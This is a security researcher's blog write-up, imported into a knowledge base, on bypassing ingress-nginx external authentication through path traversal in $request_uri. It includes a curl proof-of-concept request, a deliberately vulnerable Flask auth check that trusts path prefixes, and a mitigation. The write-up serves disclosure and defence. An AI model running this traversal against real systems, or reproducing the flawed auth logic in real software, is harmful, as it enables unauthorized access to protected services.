---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-05-29_external-authentication-bypass-in-ingress-nginx.md
original_filename: 2022-05-29_external-authentication-bypass-in-ingress-nginx.md
title: External Authentication bypass in ingress-nginx
category: documents
detected_topics:
- sso
- access-control
- command-injection
- path-traversal
- otp
- automation-abuse
tags:
- imported
- documents
- sso
- access-control
- command-injection
- path-traversal
- otp
- automation-abuse
language: en
raw_sha256: 50f5f094e0d87ac7dfc66ed4a71cd5500a7c9bfbd0cbf9cdb758f3671bc98a2d
text_sha256: 3302787b6f833a201167fcd4ce127be82a2877c8de3223744778435979b12cf5
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: true
---

# External Authentication bypass in ingress-nginx

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-05-29_external-authentication-bypass-in-ingress-nginx.md
- Source Type: markdown
- Detected Topics: sso, access-control, command-injection, path-traversal, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: True
- Raw SHA256: `50f5f094e0d87ac7dfc66ed4a71cd5500a7c9bfbd0cbf9cdb758f3671bc98a2d`
- Text SHA256: `3302787b6f833a201167fcd4ce127be82a2877c8de3223744778435979b12cf5`


## Content

---
title: "External Authentication bypass in ingress-nginx"
page_title: "External Authentication bypass in ingress-nginx - xvnpw personal blog"
url: "https://xvnpw.github.io/posts/external_authentication_bypass_in_ingress_nginx/"
final_url: "https://xvnpw.github.io/posts/external_authentication_bypass_in_ingress_nginx/"
authors: ["Niemiec Marcin (@xvnpw)"]
programs: ["Kubernetes"]
bugs: ["Path traversal", "Authentication bypass"]
bounty: "500"
publication_date: "2022-05-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2598
---

# External Authentication bypass in ingress-nginx

Posted on May 29, 2022

![](https://user-images.githubusercontent.com/17719543/170878532-514c01cc-aa97-42b2-adba-f61a155d9863.png)

In October 2021 I was researched [ingress-nginx](https://kubernetes.github.io/ingress-nginx/) for possibility to bypass external authentication using path traversal. It was origin story for other investigations regarding insecure usage of `$request_uri` which leaded to [Apache APISIX CVE-2021-43557](https://apisix.apache.org/blog/2021/11/23/cve-2021-43557-research-report/). I have started with report on HackerOne to Kubernetes project: <https://hackerone.com/reports/1357948>. It took long time for the team to investigate it, but in the end I got some bounty 😏 sadly report was closed as informative. They asked me to create normal [issue](https://github.com/kubernetes/ingress-nginx/issues/8644) in github as this behavior is considered as **not security issue**. For me this is still an issue of **insecure design**.

Just look on values of `X-Original-Url` and `X-Auth-Request-Redirect` that are send to external auth service:
  
  
  X-Request-Id: ***REDACTED-SUSPECT-TOKEN***  Host: auth-service.default.svc.cluster.local
  X-Original-Url: http://app.test/public-service/..%2Fprotected-service/protected
  X-Original-Method: GET
  X-Sent-From: nginx-ingress-controller
  X-Real-Ip: 192.168.99.1
  X-Forwarded-For: 192.168.99.1
  X-Auth-Request-Redirect: /public-service/..%2Fprotected-service/protected
  Connection: close
  User-Agent: curl/7.75.0
  Accept: */*
  

Root cause of the problem, is how nginx is handling `$request_uri` variable. It’s documented very “frugal”:

![](https://user-images.githubusercontent.com/17719543/170879498-1cca915f-9c5f-45f3-a6fc-fdfc97ff22a2.png)

For me it’s not enough. There should be brought documentation of risks associated with consuming not normalized paths. After pointing it out to nginx team, I got response that it’s obvious that `$request_uri` is not normalized and developers should take care of their projects 😕. This would be perfect world, but we are not living in such. Just compare it with documentation in [envoy](https://www.envoyproxy.io):

  * [rejecting-client-requests-with-escaped-slashes](https://www.getambassador.io/docs/edge-stack/latest/topics/running/ambassador/#rejecting-client-requests-with-escaped-slashes) \- although it’s not directly for Emissary. It’s describing well envoy concerts for escaped slashes
  * [GHSA-xcx5-93pw-jw2w](https://github.com/envoyproxy/envoy/security/advisories/GHSA-xcx5-93pw-jw2w) (CVE-2019–9901) - description of risks associated with normalizing paths in envoy
  * [envoy http connection manager options](https://www.envoyproxy.io/docs/envoy/latest/api-v3/extensions/filters/network/http_connection_manager/v3/http_connection_manager.proto) \- look for two particular: `normalize_path` and `path_with_escaped_slashes_action`

**If you thinks similar. Put your comment in<https://github.com/kubernetes/ingress-nginx/issues/8644>**

## Setting the stage

### install ingress-nginx into Kubernetes:
  
  
  helm upgrade --install ingress-nginx ingress-nginx \
  --repo https://kubernetes.github.io/ingress-nginx \
  --namespace ingress-nginx --create-namespace
  

In case of problems follow [official guide](https://kubernetes.github.io/ingress-nginx/deploy/).

### deploy test application
  
  
  kubectl apply -f \
  https://raw.githubusercontent.com/xvnpw/k8s-ingress-auth-bypass/master/app.yaml
  

### [optional] forward ingress port
  
  
  kubectl port-forward service/ingress-nginx-controller \ 
  -n ingress-nginx 8080:80
  

### verify services

First public service. It should be available without authentication:
  
  
  $ curl http://127.0.0.1:8080/public-service/public -H "Host: app.test"
  {"data":"public data"}
  

and now protected:
  
  
  $ curl http://127.0.0.1:8080/protected-service/protected  -H "Host: app.test"
  <html>
  <head><title>401 Authorization Required</title></head>
  <body>
  <center><h1>401 Authorization Required</h1></center>
  <hr><center>nginx</center>
  </body>
  </html>
  
  $ curl http://127.0.0.1:8080/protected-service/protected \
  -H "X-Api-Key=***REDACTED*** -H "Host: app.test"
  {"data":"protected data"}
  

as you can see I need to provide “secret-api-key” to get resource.

## Exploitation

Let’s send request with path traversal
  
  
  $ curl \
  --path-as-is http://127.0.0.1:8080/public-service/../protected-service/protected 
  -H "Host: app.test"
  {"data":"protected data"}
  

As you can see, I was able to bypass uri restrictions 😄

## Authentication service

Of course **not all** authentication services will be vulnerable. Only those that are making specific decisions based on requested paths. In my case service looks like this:
  
  
  @app.route('/verify')
  def verify():
  print(request.headers, file=sys.stderr)
  api_key=***REDACTED***X-Api-Key')
  request_redirect = request.headers.get('X-Auth-Request-Redirect')
  
  if request_redirect and request_redirect.startswith("/public-service/"):
  return Response(status = HTTPStatus.NO_CONTENT)
  
  if api_key == "secret-api-key":  
  return Response(status = HTTPStatus.NO_CONTENT)
  
  return Response(status = HTTPStatus.UNAUTHORIZED)
  

and ingress is defined as:
  
  
  apiVersion: networking.k8s.io/v1
  kind: Ingress
  metadata:
  name: my-ingress
  annotations:
  kubernetes.io/ingress.class: "nginx"
  nginx.ingress.kubernetes.io/rewrite-target: /$1
  nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify
  spec:
  rules:
  - host: app.test
  http:
  paths:
  - path: /public-service/(.*)
  pathType: Prefix
  backend:
  service:
  name: public-service
  port:
  number: 8080
  - path: /protected-service/(.*)
  pathType: Prefix
  backend:
  service:
  name: protected-service
  port:
  number: 8080
  

### Mitigation

One thing is to not trust content of `X-Original-Uri` and `X-Auth-Request-Redirect` headers. But there is also nice variable that can be used: `$service_name`
  
  
  apiVersion: networking.k8s.io/v1
  kind: Ingress
  metadata:
  name: my-ingress
  annotations:
  nginx.ingress.kubernetes.io/rewrite-target: /$1
  nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify
  nginx.ingress.kubernetes.io/configuration-snippet: |
  more_set_input_headers "X-Forwarded-Scheme: $scheme";
  more_set_input_headers "X-Forwarded-Uri: $uri";
  more_set_input_headers "X-Forwarded-Prefix: $service_name";
  more_set_input_headers "X-Forwarded-Host: $http_host";
  

it allows to get name of service in kubernetes that is targeted by request and pass it to `auth-url`. This way it’s not manipulated!

## Summary

I’m really happy that I have asked myself what is `X-Auth-Request-Redirect` header 🙂 This question took me for nice adventure, where I have checked source code of several ingress controllers.

What is sad is how nginx is considering `$request_uri` and how hard is to convince both nginx and ingress-nginx team that this is real security problem.

Whole code of this example is here <https://github.com/xvnpw/k8s-ingress-auth-bypass>.

### Other articles from this series

  * [CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable](https://xvnpw.github.io/posts/cve_2021_43557_apache_apisix_path_traversal_in_request_uri_variable/)
  * [Path traversal in authorization context in Traefik and HAProxy](https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_traefik_and_haproxy/)
  * [Path traversal in authorization context in Emissary](https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_emissary/)
  * [Path traversal in authorization context in Kong and F5 NGINX](https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_kong_and_f5_nginx/)
  * [Bug bounty tips for nginx $request_uri path traversal bypass](https://xvnpw.github.io/posts/bug_bounty_tips_for_nginx_request_uri_path_traversal_bypass/)
  * [Hunting for buggy authentication/authorization services on github](https://xvnpw.github.io/posts/hunting_for_buggy_authentication_authorization_services_on_github/)

* * *

Thanks for reading! You can follow me on [Twitter](https://twitter.com/xvnpw).

  * [kubernetes](/tags/kubernetes)
  * [ingress](/tags/ingress)
  * [nginx](/tags/nginx)
  * [path-traversal](/tags/path-traversal)
